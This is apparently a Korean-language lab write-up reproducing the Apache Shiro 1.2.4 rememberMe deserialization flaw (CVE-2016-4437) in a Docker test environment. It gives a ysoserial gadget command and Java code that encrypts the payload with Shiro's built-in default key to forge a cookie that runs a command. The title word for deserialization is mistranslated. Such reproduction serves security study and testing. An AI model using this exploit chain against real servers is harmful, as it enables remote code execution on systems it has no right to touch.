# Apache Shiro 1.2.4 반서열화운동 (CVE-2016-4437)
Apache Shiro는 인증, 권한 부여, 암호화 및 세션 관리와 같은 기능을 제공하는 오픈 소스 보안 프레임워크이다. Shiro 프레임워크는 직관적이고 사용하기 쉬우며 동시에 강력한 보안을 제공할 수 있다.
Apache Shiro 1.2.4 및 그 이전 버전에서는 암호화된 사용자 정보가 직렬화된 후 "remember-me"라는 이름의 쿠키에 저장되고 공격자는 Shiro의 기본 키를 사용하여 사용자 쿠키를 위조하고 Java 역직렬화 취약점을 활용하여 대상 컴퓨터에서 임의의 명령을 실행할 수 있다.

# 취약점 환경
다음 명령을 실행하여 Apache Shiro 1.2.4를 사용하는 웹 서비스를 시작할 수 있다.
```
docker compose up -d
```
서비스가 시작된 후 http://your-ip:8080을 방문하여 admin:vulhub을 사용하여 로그인할 수 있다.

# 취약점 재현
ysoserial를 사용하여 CommonsBeanutils1 가젯 생성:
```
java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser
```
Shiro 내장 기본 키를 사용하여 Payload를 암호화:
```
package org.vulhub.shirodemo;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;

import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TestRemember {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("/path", "to", "poc.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```
rememberMe 쿠키를 전송하면 touch/tmp/success를 성공적으로 실행할 수 있다 :
<br><img src="1.png" width="1000" height="400" title="px(픽셀) 크기 설정" alt="1번 이미지"></img><br/>


